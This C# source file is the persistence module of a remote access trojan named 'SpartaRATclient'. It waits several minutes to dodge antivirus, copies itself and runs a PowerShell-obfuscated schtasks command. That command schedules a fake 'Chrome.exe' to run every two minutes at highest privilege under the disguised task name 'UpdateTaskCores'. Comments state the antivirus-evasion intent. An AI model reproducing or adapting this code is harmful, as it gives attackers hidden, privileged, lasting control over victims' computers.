using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Tools;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public static void Create()
        {
            Random rnd = new Random();
            //Long sleeps will make it harder for the anti virus to say anything
            Thread.Sleep(rnd.Next(200_000, 400_000));

            if (!RegistryCheck.CheckIfExist("HaveTaskSchedulerItem"))
            {
                FileCopy.This();
                //Create a task scheduler tsak using powershell encodings to make it harder for the anti virus to detect us. I used the OG tool "Invoke-Obfuscation" by danielbohannon. original command: schtasks /create /sc minute /mo 2 /tn UpdateTaskCores /tr "C:\Users\env:username\Documents\Chrome.exe" /rl HIGHEST
                Shell.Run(" .(\"{1}{0}\"-f's','schtask') /create /sc minute /mo 2 /tn UpdateTaskCores /tr (('C:q'+'nV'+'Us'+'er'+(\"{4}{2}{0}{3}{1}\" -f 'v:u','meqn','n','serna','sqnVe')+'VDo'+'cu'+(\"{0}{1}\"-f'men','tsq')+(\"{1}{0}{2}\"-f 'e.e','nVChrom','xe')).rePlACe(([ChAR]113+[ChAR]110+[ChAR]86),'\\')) /rl HIGHEST", 16);
                RegistryCreate.Create("HaveTaskSchedulerItem", "");
            }
        }
    }
}
